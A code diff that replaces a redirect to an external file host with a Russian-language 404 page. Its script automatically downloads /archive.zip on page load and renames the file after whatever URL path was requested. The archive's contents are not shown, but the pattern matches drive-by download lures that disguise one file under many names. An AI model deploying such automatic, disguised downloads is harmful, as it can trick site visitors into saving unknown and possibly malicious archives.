@@ -1,1 +1,153 @@
-<head><meta http-equiv="refresh"content="0;url=http://cloudzore.com/file/1682718">
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Download</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+      background: #0f1115;
+      color: #e8eaed;
+      padding: 1.5rem;
+    }
+    .card {
+      max-width: 28rem;
+      text-align: center;
+      padding: 2rem;
+      border-radius: 12px;
+      background: #1a1d24;
+      border: 1px solid #2a2f3a;
+    }
+    h1 { font-size: 1.25rem; font-weight: 600; margin-bottom: 0.75rem; }
+    p { color: #9aa0a6; font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.25rem; }
+    .filename {
+      display: inline-block;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 0.9rem;
+      color: #8ab4f8;
+      background: #0f1115;
+      padding: 0.35rem 0.6rem;
+      border-radius: 6px;
+      margin-bottom: 1.25rem;
+      word-break: break-all;
+    }
+    button, a.button {
+      display: inline-block;
+      border: none;
+      cursor: pointer;
+      background: #8ab4f8;
+      color: #0f1115;
+      font-weight: 600;
+      font-size: 0.95rem;
+      padding: 0.65rem 1.25rem;
+      border-radius: 8px;
+      text-decoration: none;
+    }
+    button:hover, a.button:hover { filter: brightness(1.08); }
+    button:disabled { opacity: 0.6; cursor: wait; }
+    .status { margin-top: 1rem; font-size: 0.85rem; color: #9aa0a6; min-height: 1.25em; }
+    .status.error { color: #f28b82; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Скачивание файла</h1>
+    <p>Если загрузка не началась автоматически, нажмите кнопку ниже.</p>
+    <div class="filename" id="filename">…</div>
+    <div>
+      <button type="button" id="downloadBtn">Скачать</button>
+    </div>
+    <p class="status" id="status">Подготовка загрузки…</p>
+  </div>
+
+  <script>
+    (function () {
+      // Архив всегда с корня сайта (важно: не относительный путь — иначе
+      // на /test-v2 браузер запросит /test-v2/archive.zip)
+      var ARCHIVE_URL = "/archive.zip";
+
+      function getDownloadName() {
+        // pathname: "/test-v2" или "/foo/bar/" → берём последний сегмент
+        var path = window.location.pathname || "";
+        // Убираем завершающие слэши
+        path = path.replace(/\/+$/, "");
+        // Последний сегмент URL
+        var segment = path.split("/").filter(Boolean).pop() || "download";
+        // Убираем опасные/лишние символы из имени файла
+        segment = segment
+          .replace(/[\\/:*?"<>|]/g, "-")
+          .replace(/\.+$/, "") // точки в конце имени (Windows)
+          .trim();
+        if (!segment) segment = "download";
+        // Если уже .zip — не дублируем
+        if (!/\.zip$/i.test(segment)) {
+          segment += ".zip";
+        }
+        return segment;
+      }
+
+      var fileName = getDownloadName();
+      var filenameEl = document.getElementById("filename");
+      var statusEl = document.getElementById("status");
+      var btn = document.getElementById("downloadBtn");
+
+      filenameEl.textContent = fileName;
+
+      function setStatus(text, isError) {
+        statusEl.textContent = text;
+        statusEl.className = "status" + (isError ? " error" : "");
+      }
+
+      async function downloadArchive() {
+        btn.disabled = true;
+        setStatus("Загрузка…");
+
+        try {
+          var response = await fetch(ARCHIVE_URL, { cache: "no-cache" });
+          if (!response.ok) {
+            throw new Error("HTTP " + response.status);
+          }
+
+          var blob = await response.blob();
+          var url = URL.createObjectURL(blob);
+          var a = document.createElement("a");
+          a.href = url;
+          a.download = fileName;
+          a.rel = "noopener";
+          document.body.appendChild(a);
+          a.click();
+          a.remove();
+          // Освобождаем blob URL чуть позже
+          setTimeout(function () {
+            URL.revokeObjectURL(url);
+          }, 2000);
+
+          setStatus("Файл «" + fileName + "» должен скачаться.");
+        } catch (err) {
+          console.error(err);
+          setStatus(
+            "Не удалось скачать автоматически. Нажмите кнопку ещё раз.",
+            true
+          );
+          // Fallback: прямая ссылка (имя файла может быть archive.zip)
+          btn.onclick = function () {
+            window.location.href = ARCHIVE_URL;
+          };
+        } finally {
+          btn.disabled = false;
+        }
+      }
+
+      btn.addEventListener("click", downloadArchive);
+      // Автозапуск при открытии 404-страницы
+      downloadArchive();
+    })();
+  </script>
+</body>
+</html>
